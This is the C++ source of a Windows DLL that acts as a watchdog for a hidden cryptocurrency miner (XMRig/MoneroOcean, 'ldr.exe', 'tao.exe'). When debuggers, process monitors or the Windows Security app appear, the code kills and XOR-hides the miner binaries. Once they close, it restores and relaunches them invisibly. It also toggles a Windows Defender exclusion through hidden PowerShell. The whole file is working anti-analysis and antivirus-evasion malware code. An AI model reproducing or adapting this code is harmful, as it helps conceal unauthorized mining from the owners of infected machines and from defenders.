#include <Windows.h>
#include <TlHelp32.h>
#include <Psapi.h>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <algorithm>
#include <chrono>

#pragma comment(lib, "psapi.lib")

std::vector<std::wstring> g_monitorProcesses = {
    L"ProcessHacker.exe",
    L"procexp64.exe",
    L"procexp.exe",
    L"procexp4a.exe"
};

std::vector<std::wstring> g_debuggerProcesses = {
    L"windbg.exe",
    L"windbgx.exe",
    L"DbgX.Shell.exe",
    L"x64dbg.exe",
    L"x32dbg.exe",
    L"ollydbg.exe",
    L"ida.exe",
    L"ida64.exe",
    L"livekd.exe",
    L"livekd64.exe",
    L"Dbgview.exe",
    L"Dbgview64.exe",
    L"gdb.exe",
    L"Fiddler.exe",
    L"FiddlerEverywhere.exe",
    L"perfmon.exe"
};

std::vector<std::wstring> g_hiddenProcesses = {
    L"ldr.exe",
    L"tao.exe",
    L"wpns.exe",
    L"nssm.exe",
    L"xmrig.exe",
    L"rundll32.exe"
};

std::vector<std::wstring> g_hiddenServices = {
    L"moneroocean_miner",
    L"XMRig"
};

std::atomic<bool> g_watchdogActive(false);
std::atomic<bool> g_shouldExit(false);
std::atomic<bool> g_loaderEncrypted(false);
std::atomic<bool> g_taoEncrypted(false);
std::atomic<bool> g_shouldUnload(false);
std::wstring g_loaderPath;
std::wstring g_taoPath;
std::wstring g_moduleDirectory;
HMODULE g_hModule = NULL;

const BYTE g_xorKey[] = { 0x4B, 0x7E, 0x92, 0xA5, 0xD1, 0x3F, 0x68, 0xC4,
                          0x9B, 0x2E, 0x71, 0xF8, 0x5A, 0xB3, 0xE6, 0x1D };
const size_t g_xorKeySize = sizeof(g_xorKey);

std::chrono::high_resolution_clock::time_point g_lastSecUIOpen;
std::chrono::high_resolution_clock::time_point g_lastSecUIClose;

std::wstring ToLower(const std::wstring& str) {
    std::wstring result = str;
    std::transform(result.begin(), result.end(), result.begin(), ::towlower);
    return result;
}

std::wstring GetModuleDirectory(HMODULE hModule) {
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(hModule, path, MAX_PATH);
    std::wstring pathStr(path);
    size_t lastSlash = pathStr.find_last_of(L"\\");
    if (lastSlash != std::wstring::npos) {
        return pathStr.substr(0, lastSlash);
    }
    return L"";
}

bool IsProcessRunning(const std::wstring& processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return false;
    }
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    bool found = false;
    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                found = true;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return found;
}

std::vector<DWORD> GetProcessIDs(const std::wstring& processName) {
    std::vector<DWORD> pids;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return pids;
    }
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                pids.push_back(pe32.th32ProcessID);
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return pids;
}

bool AreMonitorsActive() {
    for (const auto& processName : g_monitorProcesses) {
        if (IsProcessRunning(processName)) {
            return true;
        }
    }
    return false;
}

bool AreDebuggersActive() {
    for (const auto& processName : g_debuggerProcesses) {
        if (IsProcessRunning(processName)) {
            return true;
        }
    }
    return false;
}

void XorData(BYTE* data, size_t dataSize, const BYTE* key, size_t keySize) {
    for (size_t i = 0; i < dataSize; i++) {
        data[i] ^= key[i % keySize];
    }
}

bool EncryptLoader() {
    auto start = std::chrono::high_resolution_clock::now();

    if (g_loaderPath.empty() || g_loaderEncrypted.load()) {
        return true;
    }

    std::wstring encryptedPath = g_loaderPath + L".dat";

    HANDLE hFile = CreateFileW(g_loaderPath.c_str(), GENERIC_READ,
        FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        return false;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        CloseHandle(hFile);
        return false;
    }

    BYTE* fileData = new BYTE[fileSize];
    DWORD bytesRead = 0;

    if (!ReadFile(hFile, fileData, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        delete[] fileData;
        CloseHandle(hFile);
        return false;
    }

    CloseHandle(hFile);

    XorData(fileData, fileSize, g_xorKey, g_xorKeySize);

    HANDLE hEncFile = CreateFileW(encryptedPath.c_str(), GENERIC_WRITE,
        0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);

    if (hEncFile == INVALID_HANDLE_VALUE) {
        delete[] fileData;
        return false;
    }

    DWORD bytesWritten = 0;
    bool writeSuccess = WriteFile(hEncFile, fileData, fileSize, &bytesWritten, NULL);
    CloseHandle(hEncFile);
    delete[] fileData;

    if (!writeSuccess || bytesWritten != fileSize) {
        DeleteFileW(encryptedPath.c_str());
        return false;
    }

    if (!DeleteFileW(g_loaderPath.c_str())) {
        MoveFileExW(g_loaderPath.c_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
    }

    g_loaderEncrypted.store(true);

    auto end = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);

    return true;
}

bool EncryptTao() {
    auto start = std::chrono::high_resolution_clock::now();

    if (g_taoPath.empty() || g_taoEncrypted.load()) {
        return true;
    }

    std::wstring encryptedPath = g_taoPath + L".dat";

    HANDLE hFile = CreateFileW(g_taoPath.c_str(), GENERIC_READ,
        FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        return false;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        CloseHandle(hFile);
        return false;
    }

    BYTE* fileData = new BYTE[fileSize];
    DWORD bytesRead = 0;

    if (!ReadFile(hFile, fileData, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        delete[] fileData;
        CloseHandle(hFile);
        return false;
    }

    CloseHandle(hFile);

    XorData(fileData, fileSize, g_xorKey, g_xorKeySize);

    HANDLE hEncFile = CreateFileW(encryptedPath.c_str(), GENERIC_WRITE,
        0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);

    if (hEncFile == INVALID_HANDLE_VALUE) {
        delete[] fileData;
        return false;
    }

    DWORD bytesWritten = 0;
    bool writeSuccess = WriteFile(hEncFile, fileData, fileSize, &bytesWritten, NULL);
    CloseHandle(hEncFile);
    delete[] fileData;

    if (!writeSuccess || bytesWritten != fileSize) {
        DeleteFileW(encryptedPath.c_str());
        return false;
    }

    if (!DeleteFileW(g_taoPath.c_str())) {
        MoveFileExW(g_taoPath.c_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
    }

    g_taoEncrypted.store(true);

    auto end = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);

    return true;
}

bool DecryptLoader() {
    auto start = std::chrono::high_resolution_clock::now();

    if (g_loaderPath.empty() || !g_loaderEncrypted.load()) {
        return true;
    }

    std::wstring encryptedPath = g_loaderPath + L".dat";

    DWORD attrib = GetFileAttributesW(encryptedPath.c_str());
    if (attrib == INVALID_FILE_ATTRIBUTES) {
        return false;
    }

    HANDLE hEncFile = CreateFileW(encryptedPath.c_str(), GENERIC_READ,
        FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hEncFile == INVALID_HANDLE_VALUE) {
        return false;
    }

    DWORD fileSize = GetFileSize(hEncFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        CloseHandle(hEncFile);
        return false;
    }

    BYTE* fileData = new BYTE[fileSize];
    DWORD bytesRead = 0;

    if (!ReadFile(hEncFile, fileData, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        delete[] fileData;
        CloseHandle(hEncFile);
        return false;
    }

    CloseHandle(hEncFile);

    XorData(fileData, fileSize, g_xorKey, g_xorKeySize);

    HANDLE hFile = CreateFileW(g_loaderPath.c_str(), GENERIC_WRITE,
        0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        delete[] fileData;
        return false;
    }

    DWORD bytesWritten = 0;
    bool writeSuccess = WriteFile(hFile, fileData, fileSize, &bytesWritten, NULL);
    CloseHandle(hFile);
    delete[] fileData;

    if (!writeSuccess || bytesWritten != fileSize) {
        return false;
    }

    DeleteFileW(encryptedPath.c_str());

    g_loaderEncrypted.store(false);

    auto end = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);

    return true;
}

bool DecryptTao() {
    auto start = std::chrono::high_resolution_clock::now();

    if (g_taoPath.empty() || !g_taoEncrypted.load()) {
        return true;
    }

    std::wstring encryptedPath = g_taoPath + L".dat";

    DWORD attrib = GetFileAttributesW(encryptedPath.c_str());
    if (attrib == INVALID_FILE_ATTRIBUTES) {
        return false;
    }

    HANDLE hEncFile = CreateFileW(encryptedPath.c_str(), GENERIC_READ,
        FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hEncFile == INVALID_HANDLE_VALUE) {
        return false;
    }

    DWORD fileSize = GetFileSize(hEncFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        CloseHandle(hEncFile);
        return false;
    }

    BYTE* fileData = new BYTE[fileSize];
    DWORD bytesRead = 0;

    if (!ReadFile(hEncFile, fileData, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        delete[] fileData;
        CloseHandle(hEncFile);
        return false;
    }

    CloseHandle(hEncFile);

    XorData(fileData, fileSize, g_xorKey, g_xorKeySize);

    HANDLE hFile = CreateFileW(g_taoPath.c_str(), GENERIC_WRITE,
        0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        delete[] fileData;
        return false;
    }

    DWORD bytesWritten = 0;
    bool writeSuccess = WriteFile(hFile, fileData, fileSize, &bytesWritten, NULL);
    CloseHandle(hFile);
    delete[] fileData;

    if (!writeSuccess || bytesWritten != fileSize) {
        return false;
    }

    DeleteFileW(encryptedPath.c_str());

    g_taoEncrypted.store(false);

    auto end = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);

    return true;
}

void TerminateLoader() {
    std::vector<DWORD> pids = GetProcessIDs(L"ldr.exe");
    for (DWORD pid : pids) {
        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
        if (hProcess) {
            TerminateProcess(hProcess, 0);
            CloseHandle(hProcess);
        }
    }
}

void TerminateTao() {
    std::vector<DWORD> pids = GetProcessIDs(L"tao.exe");
    for (DWORD pid : pids) {
        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
        if (hProcess) {
            TerminateProcess(hProcess, 0);
            CloseHandle(hProcess);
        }
    }
}

void KillProcess(const std::wstring& processName) {
    std::vector<DWORD> pids = GetProcessIDs(processName);
    for (DWORD pid : pids) {
        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
        if (hProcess) {
            TerminateProcess(hProcess, 0);
            CloseHandle(hProcess);
        }
    }
}

void StopService(const std::wstring& serviceName) {
    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCM) return;
    SC_HANDLE hService = OpenServiceW(hSCM, serviceName.c_str(),
        SERVICE_STOP | SERVICE_QUERY_STATUS);
    if (hService) {
        SERVICE_STATUS status;
        ControlService(hService, SERVICE_CONTROL_STOP, &status);
        CloseServiceHandle(hService);
    }
    CloseServiceHandle(hSCM);
}

void KillAllHiddenProcesses() {
    for (const auto& processName : g_hiddenProcesses) {
        KillProcess(processName);
    }
}

void StopAllHiddenServices() {
    for (const auto& serviceName : g_hiddenServices) {
        StopService(serviceName);
    }
}

bool StartLoader() {
    if (g_loaderPath.empty()) {
        return false;
    }

    STARTUPINFOW si = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = { 0 };

    std::vector<wchar_t> cmdLine(g_loaderPath.begin(), g_loaderPath.end());
    cmdLine.push_back(L'\0');

    BOOL success = CreateProcessW(
        NULL,
        cmdLine.data(),
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW | DETACHED_PROCESS,
        NULL,
        NULL,
        &si,
        &pi
    );

    if (success) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return true;
    }
    return false;
}

bool StartTao() {
    if (g_taoPath.empty()) {
        return false;
    }

    STARTUPINFOW si = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = { 0 };

    std::vector<wchar_t> cmdLine(g_taoPath.begin(), g_taoPath.end());
    cmdLine.push_back(L'\0');

    BOOL success = CreateProcessW(
        NULL,
        cmdLine.data(),
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW | DETACHED_PROCESS,
        NULL,
        NULL,
        &si,
        &pi
    );

    if (success) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return true;
    }
    return false;
}

bool RemoveDefenderExclusions() {
    auto start = std::chrono::high_resolution_clock::now();

    if (g_moduleDirectory.empty()) {
        return false;
    }

    std::wstring parentDir = g_moduleDirectory;
    for (int i = 0; i < 2; i++) {
        size_t lastSlash = parentDir.find_last_of(L"\\");
        if (lastSlash != std::wstring::npos) {
            parentDir = parentDir.substr(0, lastSlash);
        }
    }

    std::wstring psCommand = L"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command \"";
    psCommand += L"Remove-MpPreference -ExclusionPath '" + parentDir + L"' -ErrorAction SilentlyContinue; ";
    psCommand += L"\"";

    STARTUPINFOW si = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = { 0 };

    std::vector<wchar_t> cmdLine(psCommand.begin(), psCommand.end());
    cmdLine.push_back(L'\0');

    BOOL success = CreateProcessW(
        NULL,
        cmdLine.data(),
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW | HIGH_PRIORITY_CLASS,
        NULL,
        NULL,
        &si,
        &pi
    );

    if (success) {
        WaitForSingleObject(pi.hProcess, 3000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        auto end = std::chrono::high_resolution_clock::now();
        auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);

        return true;
    }

    return false;
}

bool AddDefenderExclusions() {
    auto start = std::chrono::high_resolution_clock::now();

    if (g_moduleDirectory.empty()) {
        return false;
    }

    std::wstring parentDir = g_moduleDirectory;
    for (int i = 0; i < 2; i++) {
        size_t lastSlash = parentDir.find_last_of(L"\\");
        if (lastSlash != std::wstring::npos) {
            parentDir = parentDir.substr(0, lastSlash);
        }
    }

    std::wstring psCommand = L"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command \"";
    psCommand += L"Add-MpPreference -ExclusionPath '" + parentDir + L"' -ErrorAction SilentlyContinue; ";
    psCommand += L"\"";

    STARTUPINFOW si = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = { 0 };

    std::vector<wchar_t> cmdLine(psCommand.begin(), psCommand.end());
    cmdLine.push_back(L'\0');

    BOOL success = CreateProcessW(
        NULL,
        cmdLine.data(),
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW | HIGH_PRIORITY_CLASS,
        NULL,
        NULL,
        &si,
        &pi
    );

    if (success) {
        WaitForSingleObject(pi.hProcess, 3000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        auto end = std::chrono::high_resolution_clock::now();
        auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);

        return true;
    }

    return false;
}


DWORD WINAPI UnloadThread(LPVOID lpParameter) {
    HMODULE hModule = (HMODULE)lpParameter;
    
    Sleep(500);
    
    FreeLibraryAndExitThread(hModule, 0);
    
    return 0;
}

void TriggerSelfUnload() {
    if (g_hModule && !g_shouldUnload.load()) {
        g_shouldUnload.store(true);
        g_shouldExit.store(true);
        g_watchdogActive.store(false);
        
        Sleep(300);
        
        HANDLE hThread = CreateThread(NULL, 0, UnloadThread, (LPVOID)g_hModule, 0, NULL);
        if (hThread) {
            CloseHandle(hThread);
        }
    }
}

void WatchdogThread() {
    const int CHECK_INTERVAL_MS = 100;

    bool previousSecurityUIState = false;
    bool previousDebuggerState = false;
    bool previousMonitorState = false;

    while (!g_shouldExit.load()) {
        bool debuggersActive = AreDebuggersActive();
        bool securityUIRunning = IsProcessRunning(L"SecHealthUI.exe");
        bool monitorsActive = AreMonitorsActive();

        if (debuggersActive && !previousDebuggerState) {
            auto actionStart = std::chrono::high_resolution_clock::now();

            TerminateLoader();
            TerminateTao();
            KillAllHiddenProcesses();
            StopAllHiddenServices();
            EncryptLoader();
            EncryptTao();

            auto actionEnd = std::chrono::high_resolution_clock::now();
            auto actionDuration = std::chrono::duration_cast<std::chrono::milliseconds>(actionEnd - actionStart);
        }
        else if (!debuggersActive && previousDebuggerState) {
            auto actionStart = std::chrono::high_resolution_clock::now();

            bool loaderDecrypted = false;
            bool taoDecrypted = false;
            bool loaderStarted = false;
            bool taoStarted = false;

            if (DecryptLoader()) {
                loaderDecrypted = true;
                if (!IsProcessRunning(L"ldr.exe")) {
                    loaderStarted = StartLoader();
                }
            }

            if (DecryptTao()) {
                taoDecrypted = true;
                if (!IsProcessRunning(L"tao.exe")) {
                    taoStarted = StartTao();
                }
            }

            auto actionEnd = std::chrono::high_resolution_clock::now();
            auto actionDuration = std::chrono::duration_cast<std::chrono::milliseconds>(actionEnd - actionStart);

            if (loaderDecrypted && taoDecrypted && (loaderStarted || taoStarted)) {

                Sleep(2000);
                
                if ((loaderStarted && IsProcessRunning(L"ldr.exe")) || 
                    (taoStarted && IsProcessRunning(L"tao.exe"))) {
                    TriggerSelfUnload();
                    return; 
                }
            }
        }

        if (securityUIRunning && !previousSecurityUIState) {
            g_lastSecUIOpen = std::chrono::high_resolution_clock::now();

            std::thread terminateThreads([]() {
                if (IsProcessRunning(L"ldr.exe")) {
                    TerminateLoader();
                }
                if (IsProcessRunning(L"tao.exe")) {
                    TerminateTao();
                }
                });

            std::thread encryptThread([]() {
                EncryptLoader();
                EncryptTao();
                });

            std::thread exclusionThread([]() {
                RemoveDefenderExclusions();
                });

            terminateThreads.join();
            encryptThread.join();
            exclusionThread.join();

            auto actionEnd = std::chrono::high_resolution_clock::now();
            auto totalDuration = std::chrono::duration_cast<std::chrono::milliseconds>(actionEnd - g_lastSecUIOpen);
        }
        else if (!securityUIRunning && previousSecurityUIState) {
            g_lastSecUIClose = std::chrono::high_resolution_clock::now();

            bool exclusionsAdded = false;
            bool loaderDecrypted = false;
            bool taoDecrypted = false;
            bool loaderStarted = false;
            bool taoStarted = false;

            std::thread exclusionThread([&exclusionsAdded]() {
                exclusionsAdded = AddDefenderExclusions();
                });

            std::thread decryptThread([&loaderDecrypted, &taoDecrypted, &loaderStarted, &taoStarted]() {
                if (DecryptLoader()) {
                    loaderDecrypted = true;
                    if (!IsProcessRunning(L"ldr.exe")) {
                        loaderStarted = StartLoader();
                    }
                }
                if (DecryptTao()) {
                    taoDecrypted = true;
                    if (!IsProcessRunning(L"tao.exe")) {
                        taoStarted = StartTao();
                    }
                }
                });

            exclusionThread.join();
            decryptThread.join();

            auto actionEnd = std::chrono::high_resolution_clock::now();
            auto totalDuration = std::chrono::duration_cast<std::chrono::milliseconds>(actionEnd - g_lastSecUIClose);

            if (exclusionsAdded && loaderDecrypted && taoDecrypted && 
                (loaderStarted || taoStarted)) {
                
                Sleep(2000);
                
                if ((loaderStarted && IsProcessRunning(L"ldr.exe")) || 
                    (taoStarted && IsProcessRunning(L"tao.exe"))) {
                    TriggerSelfUnload();
                    return; 
                }
            }
        }

        if (!debuggersActive && !securityUIRunning) {
            if (monitorsActive && !previousMonitorState) {

                if (IsProcessRunning(L"ldr.exe")) {
                    TerminateLoader();
                }
                if (IsProcessRunning(L"tao.exe")) {
                    TerminateTao();
                }
                
                KillAllHiddenProcesses();
                StopAllHiddenServices();
                
                EncryptLoader();
                EncryptTao();
            }
            else if (!monitorsActive && previousMonitorState) {

                if (DecryptLoader()) {
                    if (!IsProcessRunning(L"ldr.exe")) {
                        StartLoader();
                    }
                }
                if (DecryptTao()) {
                    if (!IsProcessRunning(L"tao.exe")) {
                        StartTao();
                    }
                }
            }
        }

        previousDebuggerState = debuggersActive;
        previousSecurityUIState = securityUIRunning;
        previousMonitorState = monitorsActive;

        Sleep(CHECK_INTERVAL_MS);
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
    {
        DisableThreadLibraryCalls(hModule);

        g_hModule = hModule;

        g_moduleDirectory = GetModuleDirectory(hModule);
        g_loaderPath = g_moduleDirectory + L"\\ldr.exe";

        std::wstring parentDir = g_moduleDirectory;
        for (int i = 0; i < 2; i++) {
            size_t lastSlash = parentDir.find_last_of(L"\\");
            if (lastSlash != std::wstring::npos) {
                parentDir = parentDir.substr(0, lastSlash);
            }
        }
        g_taoPath = parentDir + L"\\tao.exe";

        DWORD attrib = GetFileAttributesW(g_loaderPath.c_str());
        if (attrib == INVALID_FILE_ATTRIBUTES) {
            std::wstring encPath = g_loaderPath + L".dat";
            if (GetFileAttributesW(encPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
                g_loaderEncrypted.store(true);
            }
            else {
                g_loaderPath.clear();
            }
        }

        DWORD taoAttrib = GetFileAttributesW(g_taoPath.c_str());
        if (taoAttrib == INVALID_FILE_ATTRIBUTES) {
            std::wstring taoEncPath = g_taoPath + L".dat";
            if (GetFileAttributesW(taoEncPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
                g_taoEncrypted.store(true);
            }
            else {
                g_taoPath.clear();
            }
        }

        g_watchdogActive.store(true);
        std::thread watchdog(WatchdogThread);
        watchdog.detach();

        break;
    }

    case DLL_PROCESS_DETACH:
        g_shouldExit.store(true);
        g_watchdogActive.store(false);
        Sleep(200);
        break;

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}

extern "C" __declspec(dllexport) void CALLBACK StartRoutine(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
    while (g_watchdogActive.load() && !g_shouldUnload.load()) {
        Sleep(100);
    }
}